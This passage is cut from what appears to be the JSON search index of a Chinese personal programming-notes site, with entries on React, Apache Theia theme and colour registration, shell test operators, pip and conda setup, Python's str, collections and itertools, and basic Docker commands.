https://pradyunsg.me/furo/quickstart/","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-furo.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-furo.html"},{"title":"Python三方库","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-index.html"},{"title":"React","text":"前端框架 React, 官方中文: https://zh-hans.react.dev/reference/react","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-index.html"},{"title":"关于React使用自定义组件却需要使用状态","text":"找了很多种方法， 最终只有将需要一种方法: 将需要用到状态的这部分内容， 分离出去 ， 至于如何分离， 大致有两种方式 函数组件+HOOP 继承 React.Component 的类组件， 使用其中的 state 与 setState 别无它法， 除非你在自己的这个自定义类中将 React.Component 中的相关内容重写一遍， 很麻烦","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-About-React-uses-a-custom-component-but-needs-to-be-used.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-About-React-uses-a-custom-component-but-needs-to-be-used.html"},{"title":"react直接执行ts","text":"使用WebStrom创建的React的ts项目, 发现不需要手动tsc编译就可以直接运行: react-script start 创建时, 触发的实际指令: /usr/local/bin/npx --yes create-react-app . --template typescript 这里 --yes ` 表示, 若有询问, 直接给 `yes 后面研究了一下, 实际上是用了 babel 的 @babel/preset-typescript , 这个模块集成于 babel (>=7.0)内部, 在开发时, 可以在执行时候在内存中 将ts转换为js, 以实现类似ts直接执行的效果 见: https://babeljs.io/docs/babel-preset-typescript 注解 可以看到项目目录下有个 node_modules/.cache/babel-loader 目录, 相关缓存就是在这下面的.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-Perform-the-TS-problem-directly.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Perform-the-TS-problem-directly.html"},{"title":"父子组件的相互调用","text":"子组件调用父组件的方法 这个比较简单, 父组件调用子组件的时候, 像普通传参一样, 将需要调用的方法传给子组件即可. 父组件调用子组件的方法 父组件使用: render(){ return <Child ref={view => {this._childView = view || undefined}} /> } 然后通过 this._childView 调用子组件即可 详情参考: /docs/前端/框架/react/hooks/createRef","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-The-mutual-call-of-the-father-and-child-component.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-The-mutual-call-of-the-father-and-child-component.html"},{"title":"React 问题","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-index.html"},{"title":"多主题","text":"主要: node_modules/@theia/core/src/browser/theming.ts 下定义的 ThemeService 服务. 在 init 方法中注册了默认主题: protected init(): void { this.register(...BuiltinThemeProvider.themes); ... 可以看到默认主题定义: export class BuiltinThemeProvider { static readonly darkTheme: Theme = { id: 'dark', type: 'dark', label: 'Dark (Theia)', editorTheme: 'dark-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly lightTheme: Theme = { id: 'light', type: 'light', label: 'Light (Theia)', editorTheme: 'light-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly hcTheme: Theme = { id: 'hc-theia', type: 'hc', label: 'High Contrast (Theia)', editorTheme: 'hc-theia' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly hcLightTheme: Theme = { id: 'hc-theia-light', type: 'hcLight', label: 'High Contrast Light (Theia)', editorTheme: 'hc-theia-light' // loaded in /packages/monaco/src/browser/textmate/monaco-theme-registry.ts }; static readonly themes = [ BuiltinThemeProvider.darkTheme, BuiltinThemeProvider.lightTheme, BuiltinThemeProvider.hcTheme, BuiltinThemeProvider.hcLightTheme ]; } 看注释, 都是在 packages/monaco/src/browser/textmate/monaco-theme-registry.ts 定义注册的: @injectable() export class MonacoThemeRegistry { @inject(TextmateRegistryFactory) protected readonly registryFactory: TextmateRegistryFactory; initializeDefaultThemes(): void { this.register(require('../../../data/monaco-themes/vscode/dark_theia.json'), { './dark_vs.json': require('../../../data/monaco-themes/vscode/dark_vs.json'), './dark_plus.json': require('../../../data/monaco-themes/vscode/dark_plus.json') }, 'dark-theia', 'vs-dark'); this.register(require('../../../data/monaco-themes/vscode/light_theia.json'), { './light_vs.json': require('../../../data/monaco-themes/vscode/light_vs.json'), './light_plus.json': require('../../../data/monaco-themes/vscode/light_plus.json'), }, 'light-theia', 'vs'); this.register(require('../../../data/monaco-themes/vscode/hc_theia.json'), { './hc_black.json': require('../../../data/monaco-themes/vscode/hc_black.json') }, 'hc-theia', 'hc-black'); this.register(require('../../../data/monaco-themes/vscode/hc_theia_light.json'), { './hc_light.json': require('../../../data/monaco-themes/vscode/hc_light.json') }, 'hc-theia-light', 'hc-light'); } 以 dark_vs.json 为例, 其中颜色定义为: { \"$schema\": \"vscode://schemas/color-theme\", \"name\": \"Dark (Visual Studio)\", \"colors\": { \"editor.background\": \"#1E1E1E\", \"editor.foreground\": \"#D4D4D4\", ... 可以看到颜色定义为类似于: editor.background 的样式, 但是实际使用的时候, 是: --editor-background 的样式, 那么是在哪里转换的? 有几个地方 theia-core模块的定义1 theia-core模块的定义2 vs的editor下面的转换 theia-core模块的定义1 这个的触发方式是 node_modules/@theia/core/src/browser/color-application-contribution.ts 定义的事件: @injectable() export class ColorApplicationContribution implements FrontendApplicationContribution { ... onStart(): void { for (const contribution of this.colorContributions.getContributions()) { contribution.registerColors(this.colors); } this.themeService.initialized.then(() => this.update()); this.themeService.onDidColorThemeChange(() => { this.update(); this.updateThemeBackground(); }); protected update(): void { this.toUpdate.dispose(); this.windows.forEach(win => this.updateWindow(win)); this.onDidChangeEmitter.fire(); } protected updateWindow(win: Window): void { const theme = 'theia-' + this.themeService.getCurrentTheme().type; win.document.body.classList.add(theme); this.toUpdate.push(Disposable.create(() => win.document.body.classList.remove(theme))); const documentElement = win.document.documentElement; if (documentElement) { for (const id of this.colors.getColors()) { const variable = this.colors.getCurrentCssVariable(id); if (variable) { const { name, value } = variable; documentElement.style.setProperty(name, value); this.toUpdate.push(Disposable.create(() => documentElement.style.removeProperty(name))); } } } } } 如何实现 动态属性切换 也在这: documentElement.style.setProperty(name, value); 这里会拿到CSS属性名, 与对应颜色值, 使用 documentElement.style.setProperty 动态设置进去. 可以通过跟断点验证这一点. const variable = this.colors.getCurrentCssVariable(id); 调到的是 node_modules/@theia/core/src/browser/color-registry.ts 的 ColorRegistry : @injectable() export class ColorRegistry { getCurrentCssVariable(id: string): ColorCssVariable | undefined { const value = this.getCurrentColor(id); if (!value) { return undefined; } const name = this.toCssVariableName(id); return { name, value }; } toCssVariableName(id: string, prefix = 'theia'): string { return `--${prefix}-${id.replace(/\\./g, '-')}`; } } 结论 会在theia自定义的样式前加上 --theia- 前缀, 并把 . 转换为 - theia-core模块的定义2 这里主要讲如何讲 json 的内容完整的注册进去. 如果是一个完全自定义的样式变量, 光写json是不行的. 以下面的两个自定义颜色变量为例: { \"$schema\": \"vscode://schemas/color-theme\", \"name\": \"Dark (Custom)\", \"colors\": { \"ideC.editor.background\": \"#1E1E1E\", \"ideC.editor.foreground\": \"#D4D4D4\", ... 还需要将这个变量注册进去, 注册实现位于 node_modules/@theia/core/src/browser/color-application-contribution.ts 的 ColorContribution 贡献点的 registerColors 即可: import {ColorContribution} from \"@theia/core/lib/browser/color-application-contribution\"; import {ColorRegistry} from \"@theia/core/lib/browser/color-registry\"; import {ColorDefinition} from \"@theia/core/src/common/color\"; // \"ideC.editor.background\": \"#1E1E1E\", // \"ideC.editor.foreground\": \"#D4D4D4\", class CustomColor implements ColorContribution{ private customColorID: ColorDefinition[] = [ {id: \"ideC.editor.background\", description: \"color 1\"}, {id: \"ideC.editor.foreground\", description: \"color 2\"}, ] registerColors(colors: ColorRegistry): void { colors.register(...this.customColorID) } } 警告 只有注册到贡献点的id, 才会去json里面找 主要是调用的 node_modules/@theia/monaco-editor-core/src/vs/platform/theme/common/colorRegistry.ts`下 `ColorRegistry 的 registerColor . 可以理解这个 ColorRegistry() 是一个缓存, json里面的配置会先读到这里, 然后在 theia-core模块的定义1 中需要 documentElement.style.setProperty 的时候再从这个缓存里读. vs的editor下面的转换 主要文件: node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneThemeService.ts 位于 node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneThemeService.ts 下 StandaloneThemeService 的 _updateThemeOrColorMap const colorVariables: string[] = []; for (const item of colorRegistry.getColors()) { const color = this._theme.getColor(item.id, true); if (color) { colorVariables.push(`${asCssVariableName(item.id)}: ${color.toString()};`); } } 主要是 asCssVariableName , 看看它的定义: export function asCssVariableName(colorIdent: ColorIdentifier): string { return `--vscode-${colorIdent.replace(/\\./g, '-')}`; } 结论 会在vscode的样式前加上 --vscode- 前缀, 并把 . 转换为 - 那么vscode的主题是怎么实现动态设置的呢? 在 node_modules/@theia/monaco-editor-core/src/vs/editor/browser/editorDom.ts 下的 RefCountedCssRule class RefCountedCssRule { private _referenceCount: number = 0; private _styleElement: HTMLStyleElement; constructor( public readonly key: string, public readonly className: string, _containerElement: HTMLElement | undefined, public readonly properties: CssProperties, ) { this._styleElement = dom.createStyleSheet( _containerElement ); this._styleElement.textContent = this.getCssText(this.className, this.properties); } private getCssText(className: string, properties: CssProperties): string { let str = `.${className} {`; for (const prop in properties) { const value = (properties as any)[prop] as string | ThemeColor; let cssValue; if (typeof value === 'object') { cssValue = `var(${asCssVariableName(value.id)})`; } else { cssValue = value; } const cssPropName = camelToDashes(prop); str += `\\n\\t${cssPropName}: ${cssValue};`; } str += `\\n}`; return str; } public dispose(): void { this._styleElement.remove(); } ... } 其中 getCssText 就是拿到上面所说的所有转换vs的样式字符串, 主要看 位于 node_modules/@theia/monaco-editor-core/src/vs/base/browser/dom.ts 的 _styleElement 的创建: export function createStyleSheet(container: HTMLElement = document.getElementsByTagName('head')[0]): HTMLStyleElement { const style = document.createElement('style'); style.type = 'text/css'; style.media = 'screen'; container.appendChild(style); return style; } 与theia不同, 它是直接生成一个style然后写进去. 颜色与主题区别 主题注册与切换基本是通过 node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneEditor.ts 下的这两: /** * Define a new theme or update an existing theme. */ export function defineTheme(themeName: string, themeData: IStandaloneThemeData): void { const standaloneThemeService = StandaloneServices.get(IStandaloneThemeService); standaloneThemeService.defineTheme(themeName, themeData); } /** * Switches to a theme. */ export function setTheme(themeName: string): void { const standaloneThemeService = StandaloneServices.get(IStandaloneThemeService); standaloneThemeService.setTheme(themeName); } 理一下 主题 与 颜色 的区别 主题包含颜色, 与颜色定义, 但是使用的时候, 是根据注册了哪些颜色, 使用主题里的颜色. 即 只有通过 node_modules/@theia/core/src/browser/color-application-contribution.ts 的 ColorContribution 贡献点的 registerColors 注册的颜色. 下面的 colors 才能生效: { \"$schema\": \"vscode://schemas/color-theme\", \"name\": \"Dark (Custom)\", \"colors\": { \"ideC.editor.background\": \"#1E1E1E\", \"ideC.editor.foreground\": \"#D4D4D4\", ... 除非是内部已经注册的. vscode主题与theia主题的区别 默认情况下, vscode只会处理vscode相关的样式. StandaloneThemeService 上就是这样实例: function getBuiltinRules(builtinTheme: BuiltinTheme): IStandaloneThemeData { switch (builtinTheme) { case VS_LIGHT_THEME_NAME: return vs; case VS_DARK_THEME_NAME: return vs_dark; case HC_BLACK_THEME_NAME: return hc_black; case HC_LIGHT_THEME_NAME: return hc_light; } } function newBuiltInTheme(builtinTheme: BuiltinTheme): StandaloneTheme { const themeData = getBuiltinRules(builtinTheme); return new StandaloneTheme(builtinTheme, themeData); } 即只处理这四个主题. 另外还有一个 StandaloneThemeService 内的 defineTheme : public defineTheme(themeName: string, themeData: IStandaloneThemeData): void { if (!/&#94;[a-z0-9\\-]+$/i.test(themeName)) { throw new Error('Illegal theme name!'); } if (!isBuiltinTheme(themeData.base) && !isBuiltinTheme(themeName)) { throw new Error('Illegal theme base!'); } // set or replace theme this._knownThemes.set(themeName, new StandaloneTheme(themeName, themeData)); ... } 这里 this._knownThemes 也会实例一个新的. 而调用到这的条件还是 node_modules/@theia/monaco/src/browser/textmate/monaco-theme-registry.ts 下 register 的: register(json: any, includes?: { [includePath: string]: any }, givenName?: string, monacoBase?: monaco.editor.BuiltinTheme): ThemeMix { const name = givenName || json.name!; ... if (monacoBase && givenName) { ... } ... } 从这一点看, 很多样式在注册主题的时候, 只要定义了 monacoBase 是基于vs的, 就会同时包含 --theia-xxx 与 --vscode-xxx . 不过只有setTheme才会触发 --vscode-xxx 的生成, 算是一种懒加载. 同时, 由于加载顺序的原因, 往往首次加载只会生成vs主题的 --vscode-xxx 样式, 因为这个时候 colors 还没有注册上去, 而注册 colors 时, 因为主题已经设置好了, 就不会再 settheme 生成 --vscode-xxx 样式了, 除非手动切换一下主题. 故, 自定义的颜色, 还是使用 --theia-xxx 来使用 注意, 注册主题与注册颜色是两个调用","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Multi--themed.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Multi--themed.html"},{"title":"node三方库","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Three--party-library-index.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-index.html"},{"title":"nteract","text":"安装: npm install -g nteract # yarn global add nteract 注解 若想直接从源码启动: git clone https://github.com/nteract/nteract.git cd nteract yarn install yarn start 功能: 一个比较高级点的node交互环境. 与原生node的区别, 类似于 ipython 与 python 启动: nteract 也支持其他语言 可选安装Python kernel Nteract原生支持JavaScript/Node.js,但可以通过额外的kernel packages添加Python等其他语言支持: pip install ipython pip install nteract-kernel","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Three--party-library-nteracat.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-nteracat.html"},{"title":"shell条件判断if","text":"在条件表达式中进行字符串/数值比较 字符串/数值判断(字符串判断时, shell一个等号与两个等号的效果是一致的): str1 < str2 str1 排列在 str2 之前（取决于语言环境） str1 > str2 str1 排列在 str2 之后（取决于语言环境） str1 = str2 当两个串有相同内容、长度时为真 str1 != str2 当串str1和str2不等时为真 -n str1 当串的长度大于0时为真(串非空) -z str1 当串的长度为0时为真(空串) str1 当串str1为非空时为真 int1 -eq int2 两数相等为真 int1 -ne int2 两数不等为真 int1 -gt int2 int1大于int2为真 int1 -ge int2 int1大于等于int2为真 int1 -lt int2 int1小于int2为真 int1 -le int2 int1小于等于int2为真 在条件表达式中进行文件比较 文件判断: -r file 用户可读为真 -w file 用户可写为真 -x file 用户可执行为真 -f file 文件为普通文件为真 -d file 文件为目录为真 -c file 文件为字符特殊文件为真 -b file 文件为块特殊文件为真 -s file 文件大小非0时为真 -t file 当文件描述符(默认为1)指定的设备为终端时为真 -L file 文件存在符号链接为真 -e file 文件是否存在 -S file 存在 Socket 文件 -p file 存在且为 FIFO（pipe）文件 file1 -nt file2 file1 是否比 file2 新 file1 -ot file2 file1 是否比 file2 旧 file1 -ef file2 file1 和 file2 位于相同的设备上并且有相同的 inode 编号 判断符号: -a 与 -o 或 ! 非 例, 比较两个字符串是否相等的办法: if [ \"$test\"x = \"test\"x ]; then 这里的关键有几点： 使用单个等号 注意到等号两边各有一个空格：这是unix shell的要求 注意到\"$test\"x最后的x，这是特意安排的，因为当$test为空的时候，上面的表达式就变成了x = testx，显然是不相等的。而如果没有这个x，表达式就会报错： [: =: unary operator expected 不带if的写法 条件语法: command && if_success_run_this_command_too || true command || if_not_success_run_this_command_too || true 如下所示是多行脚本片段: if [ conditional_expression ]; then if_success_run_this_command else if_not_success_run_this_command fi 这里末尾的 || true 是需要的， 它可以保证这个 shell 脚本在不小心使用了 -e 选项而被调用时不会在该行意外地退出","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-condition-judgment-if.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-condition-judgment-if.html"},{"title":"包管理器","text":"pip 常用安装选项 install <package> uninstall <package> show <package> list <package> 常用参数 -t 安装时, 指定安装目录 -U , --upgrade 升级安装, 使用与正常的包升级与同版本覆盖安装 查看配置项所在配置文件路径: pip -v config list Debian下配置安装 Linux由于系统内置Python的缘故, 多少有点不同. Debian下如果没有pip, 可以使用apt安装: apt install python-pip # py2使用 apt install python3-pip # py3使用 注意这安装的是于系统默认Python匹配的版本 配置pip源基本一致（需要自定义才配置，默认国外的太慢）, 在用户目录下创建 ~/.pip/pip.conf 配置文件，内容: [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple # index-url = http://pypi.douban.com/simple # 豆瓣源;可以换成其他的源 disable-pip-version-check = true # 取消pip版本检查&#xff0c;排除每次都报最新的pip timeout = 120 [install] trusted-host = pypi.tuna.tsinghua.edu.cn # trusted-host = pypi.douban.com # 添加豆瓣源为可信主机&#xff0c;要不然可能报错 或者执行的时候直接指定: pip instal soft -i \"https://pypi.tuna.tsinghua.edu.cn/simple\" --trusted-host pypi.douban.com Mac配置pip源 cd ~ mkdir .pip && cd .pip echo \"[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=pypi.douban.com \" >pip.conf 注解 其他源 https://mirrors.aliyun.com/pypi/simple/ # 阿里云 https://pypi.douban.com/simple/ # 豆瓣 https://pypi.tuna.tsinghua.edu.cn/simple/ # 清华大学 https://pypi.mirrors.ustc.edu.cn/simple/ # 中国科学技术大学 Conda 可以通过以下地址下载对应系统的资源安装: https://repo.anaconda.com/archive/ 项目github地址: https://github.com/conda 查看有哪些环境: conda env list 创建指定Python版本的环境: conda create --name py37 python=3.7 复制环境py37为一个新的py379: conda create -n py379 --clone py37 删除环境 py379: conda remove -n py379 --all 打包为离线环境 先安装pack: conda install conda-pack # conda install -c conda-forge conda-pack 也可以pip安装: pip install conda-pack 下面以导出 venv-py379 为例 新建此环境: conda create --name venv-py379 python=3.7.9 激活环境: conda activate venv-py379 安装pack: conda install conda-pack 打包为 py379.tar.gz : conda pack -n venv-py379 -o py379.tar.gz 目标机器上使用 py379.tar.gz 创建虚拟环境所在目录并解压: mkdir venv-py379 tar -xzf py379.tar.gz -C venv-py379 激活环境: . ./venv-py379/bin/activate 清除前缀: conda-unpack 清除前缀是因为可能有些库啊什么的允许会依赖有其他路径的东西, 不清除后配置为自己conda的用不了 注解 也支持API使用: import conda_pack # 把虚拟环境 my_env 打包为 my_env.tar.gz conda_pack.pack(name=\"my_env\") # -o 参数指定打包路径和名称，把虚拟环境 my_env 打包为 out_name.tar.gz conda_pack.pack(name=\"my_env\", output=\"out_name.tar.gz\") # 把某个特定路径的虚拟环境打包为 my_env.tar.gz conda_pack.pack(prefix=\"/explicit/path/to/my_env\") conda_pack文档: https://conda.github.io/conda-pack/cli.html 打包为配置 激活环境后: conda env export > py379.yaml 然后将这个yaml复制到目标机器: conda env create -f py379.yaml","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Bag-manager.html","loc":"/yq-doc-source-docs-rear-end-python-Bag-manager.html"},{"title":"str","text":"python3一个新特性就是对文本和二进制做了更清晰的划分， 文本是str，二进制是byte(x01x06...) 编码: encode：str --> byte 解码: decode：byte --> str join: ''.join(list) #将list转换为字符串，以''中定义的字符串分隔 str.split: str.split('') #将str以''中定义的分隔为数组 rpartition, 从右边第一个指定的字符开始分隔: #!/usr/bin/python str = \"www.runoob.com\" print str.rpartition(\".\") # ('www.runoob', '.', 'com') 数字操作 hex(), 10进制整数转换成16进制 字符串的拼接使用join 字符串的拼接有两种方式 - + 如果有n个字符串需要拼接，就会进行n-1次内存空间申请 - join 只会进行一次空间申请，申请时会统计所有字符串的个数，以及总的长度。再逐一进行字符串的拷贝 求其中某值的个数 使用 count, 如: In [22]: \"1110\".count(\"1\") Out[22]: 3 zfill 字符串指定长度, 左侧补0: In [4]: \"123\".zfill(5) Out[4]: '00123' ljust 字符串指定长度, 左侧对齐, 右侧补充指定字符 如左对齐, 右侧补0: In [2]: \"123\".ljust(5, \"0\") Out[2]: '12300' rjust 字符串指定长度, 右侧对齐, 左侧补充指定字符 如右对齐, 左侧补0: In [3]: \"123\".rjust(5, \"0\") Out[3]: '00123' lower 将字符串全部转换为小写 upper 将字符串全转换为大写 title 将字符串首字母大写","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-STR.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-STR.html"},{"title":"debian下的安装","text":"使用docker配置, 见: /docs/操作系统/linux/debian/配置debian容器 安装 Python3 必要的包: apt install python3 python3-pip python3-venv vim 配置 pip 豆瓣源: cd ~ mkdir .pip && cd .pip echo \"[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple # index-url = https://pypi.douban.com/simple/ [install] trusted-host=pypi.tuna.tsinghua.edu.cn # trusted-host=pypi.douban.com \" >pip.conf 官网要求安装的依赖包: apt install libgl-dev python3-dev python3-distutils python3-setuptools 配置虚拟环境: python3 -m venv dev_venv . dev_venv/bin/activate 拉去源码并构建: apt install git cmake mkdir project && cd project git clone https://code.qt.io/pyside/pyside-setup cd pyside-setup && git checkout 6.4 && pip install -r requirements.txt python setup.py build --qtpaths=/opt/Qt/6.4.0/gcc_64/bin/qtpaths --build-tests --ignore-git --parallel=8 python setup.py install --qtpaths=/opt/Qt/6.4.0/gcc_64/bin/qtpaths --build-tests --ignore-git --parallel=8 整体源码:","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Installation-under-Debian.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Installation-under-Debian.html"},{"title":"collections","text":"deque 队列 在队列两端插入或删除元素时间复杂度都是 O(1) 在列表的开头插入或删除元 素的时间复杂度为 O(N) defaultdict 具有默认值的字典 OrderedDict 自排序的字典(保持插入时顺序) OrderedDict 内部维护着一个根据键插入顺序排序的双向链表。 每次当一个新的 元素插入进来的时候，它会被放到链表的尾部。 对于一个已经存在的键的重复赋值不会改变键的顺序。 需要注意的是，一个 OrderedDict 的大小是一个普通字典的两倍， 因为它内部维 护着另外一个链表。 所以如果你要构建一个需要大量 OrderedDict 实例的数据结构的 时候 (比如读取 100,000 行 CSV 数据到一个 OrderedDict 列表中去)， 那么你就得仔 细权衡一下是否使用 OrderedDict 带来的好处要大过额外内存消耗的影响。 Counter 计算出现次数 下面有一个 most_common() 返回出现次数最多的: words = [ 'look', 'into', 'my', 'eyes', 'look', 'into', 'my', 'eyes', 'the', 'eyes', 'the', 'eyes', 'the', 'eyes', 'not', 'around', 'the', 'eyes', \"don't\", 'look', 'around', 'the', 'eyes', 'look', 'into', 'my', 'eyes', \"you're\", 'under' ] from collections import Counter word_counts = Counter(words) # 出现频率最高的 3 个单词 top_three = word_counts.most_common(3) print(top_three) # Outputs [('eyes', 8), ('the', 5), ('look', 4)] 作为输入，Counter 对象可以接受任意的由可哈希(hashable)元素构成的序列 对象。 在底层实现上，一个 Counter 对象就是一个字典，将元素映射到它出现的次数 上。比如: >>> word_counts['not'] 1 >>> word_counts['eyes'] 8 >>> 同时也支持数学运算操作 Counter 对象在几乎所有需要制表或者计数数据的场合是非常有用的 工具。 在解决这类问题的时候你应该优先选择它，而不是手动的利用字典去实现。 Counter求交集 求交集(且保留最小值) 假设 secret = \"1123\" 且 guess = \"0111\" ， 那么 Counter(secret) 会得到: Counter({'1': 2, '2': 1, '3': 1}) 而 Counter(guess) 会得到: Counter({'0': 1, '1': 3}) 取它们的交集后得到: # 交集只有 1, 取其中小的个数 2 Counter({'1': 2}) 表示在 secret 和 guess 中都有的数字 1 的数量为 2。 total Counter().total()表示当前总的个数, 比如: Counter({'1': 2, '2': 3}).total() == 5 namedtuple 映射元组到对象: >>> from collections import namedtuple >>> Subscriber = namedtuple('Subscriber', ['addr', 'joined']) >>> sub = Subscriber('jonesy@example.com', '2012-10-19') >>> sub Subscriber(addr='jonesy@example.com', joined='2012-10-19') >>> sub.addr 'jonesy@example.com' >>> sub.joined '2012-10-19' >>> 跟元组类型是可交换 的，支持所有的普通元组操作，比如索引和解压。比如: >>> len(sub) 2 >>> addr, joined = sub >>> addr 'jonesy@example.com' >>> joined '2012-10-19' 命名元组的一个主要用途是将你的代码从下标操作中解脱出来。 命名元组另一个用途就是作为字典的替代，因为字典存储需要更多的内存空间。 注意一个命名元组是不可更改的, 如有特殊需要, 使用 _replace >>> s = Stock('ACME', 100, 123.45) >>> s Stock(name='ACME', shares=100, price=123.45) >>> s.shares = 75 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> AttributeError: can't set attribute >>> >>> s = s._replace(shares=75) >>> s Stock(name='ACME', shares=75, price=123.45) >>> ChainMap 链式合并字典. 假如你有如下两个字典: a = {'x': 1, 'z': 3 } b = {'y': 2, 'z': 4 } 现在假设你必须在两个字典中执行查找操作(比如先从 a 中找，如果找不到再在 b 中找)。 一个非常简单的解决方案就是使用 collections 模块中的 ChainMap 类。比如: from collections import ChainMap c = ChainMap(a,b) print(c['x']) # Outputs 1 (from a) print(c['y']) # Outputs 2 (from b) print(c['z']) # Outputs 3 (from a) >>> len(c) 3 >>> list(c.keys()) ['x', 'y', 'z'] >>> list(c.values()) [1, 2, 3] >>> 一个 ChainMap 接受多个字典并将它们在逻辑上变为一个字典。 然后，这些字典并 不是真的合并在一起了，ChainMap 类只是在内部创建了一个容纳这些字典的列表并重 新定义了一些常见的字典操作来遍历这个列表。 大部分字典操作都是可以正常使用的， 比如: 如果出现重复键，那么第一次出现的映射值会被返回。 因此，例子程序中的 c['z'] 总是会返回字典 a 中对应的值，而不是 b 中对应的值。 对于字典的更新或删除操作总是影响的是列表中第一个字典。比如: >>> c['z'] = 10 >>> c['w'] = 40 >>> del c['x'] >>> a {'w': 40, 'z': 10} >>> del c['y'] Traceback (most recent call last): ... KeyError: \"Key not found in the first mapping: 'y'\" >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Collections.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Collections.html"},{"title":"itertools","text":"官网: https://docs.python.org/zh-cn/3/library/itertools.html groupby 根据某个记录分组: rows = [ {'address': '5412 N CLARK', 'date': '07/01/2012'}, {'address': '5148 N CLARK', 'date': '07/04/2012'}, {'address': '5800 E 58TH', 'date': '07/02/2012'}, {'address': '2122 N CLARK', 'date': '07/03/2012'}, {'address': '5645 N RAVENSWOOD', 'date': '07/02/2012'}, {'address': '1060 W ADDISON', 'date': '07/02/2012'}, {'address': '4801 N BROADWAY', 'date': '07/01/2012'}, {'address': '1039 W GRANVILLE', 'date': '07/04/2012'}, ] 根据日期分组: from operator import itemgetter from itertools import groupby # Sort by the desired field first rows.sort(key=itemgetter('date')) # Iterate in groups for date, items in groupby(rows, key=itemgetter('date')): print(date) for i in items: print(' ', i) 一个非常重要的准备步骤是要根据指定的字段将数据排序。 因为 groupby() 仅仅 检查连续的元素，如果事先并没有排序完成的话，分组函数将得不到想要的结果。 compress itertools.compress 以一个 iterable 对象和一个相对应的Boolean选择器序列作为输入参数。 然后输出iterable对象中对 应选择器为 True 的元素: addresses = [ '5412 N CLARK', '5148 N CLARK', '5800 E 58TH', '2122 N CLARK', '5645 N RAVENSWOOD', '1060 W ADDISON', '4801 N BROADWAY', '1039 W GRANVILLE', ] counts = [ 0, 3, 10, 4, 1, 7, 6, 1] 操作: >>> from itertools import compress >>> more5 = [n > 5 for n in counts] >>> more5 [False, False, True, False, False, True, True, False] >>> list(compress(addresses, more5)) ['5800 E 58TH', '1060 W ADDISON', '4801 N BROADWAY'] >>> 关键点在于先创建一个 Boolean 序列，指示哪些元素符合条件。 然后 compress() 函数根据这个序列去选择输出对应位置为 True 的元素。 和 filter() 函数类似，compress() 也是返回的一个迭代器。 permutations 排列函数, 比如获取某个迭代的全排列 如, 从num中抽2个获取全排列: permutations('ABCD', 2) 结果: AB AC AD BA BC BD CA CB CD DA DB DC combinations 组合函数, 从某个迭代中抽取指定的不重复元素个数组合 如, 从num中抽2个组合(不重复): combinations('ABCD', 2) AB AC AD BC BD CD combinations_with_replacement 组合函数, 从某个迭代中抽取指定的重复元素个数组合 如, 从num中抽2个组合(可重复): combinations_with_replacement('ABCD', 2) AA AB AC AD BB BC BD CC CD DD zip_longest 与 zip 类似, 不过 zip 返回的结果以最短的序列为准, zip_longest以最长的序列为准: In [18]: from itertools import zip_longest In [19]: list(zip('ABC', range(5), [10, 20, 30, 40])) Out[19]: [('A', 0, 10), ('B', 1, 20), ('C', 2, 30)] In [20]: list(zip_longest('ABC', range(5), [10, 20, 30, 40])) Out[20]: [('A', 0, 10), ('B', 1, 20), ('C', 2, 30), (None, 3, 40), (None, 4, None)] In [21]: starmap 乘法运算符可以被映射到两个向量之间执行高效的点积: sum(starmap(operator.mul, zip(vec1, vec2, strict=True)))。 注解 operator 见 operator 再如统计两个数组a, b中索引与元素都相等的个数: starmap(operator.eq, zip(a, b))","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Itertools.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Itertools.html"},{"title":"docker常用指令","text":"其它 # 登录私有地址, 可加 --username= 指定用户名, 然后手动输入密码 docker login $address # cat ~/.docker/config.json 验证是否成功, 成功登录有 auths 配置 # 拉取镜像, 公共仓库用镜像名字, 私有仓库用地址名加镜像名字 docker pull $image_name # 上传镜像, 公共仓库不用地址直接镜像名即可 docker push $address $image_name # 查看已下载镜像 docker images # 运行一个容器, 若不存在自动从官网拉取 # -d 后台运行 # -p 后跟端口 port1:port2 将容器内部服务器端口port2映射到本地端口port1(如果-p后什么也不写，随机分配端口) # --rm 容器停止之后会自动删除 docker run 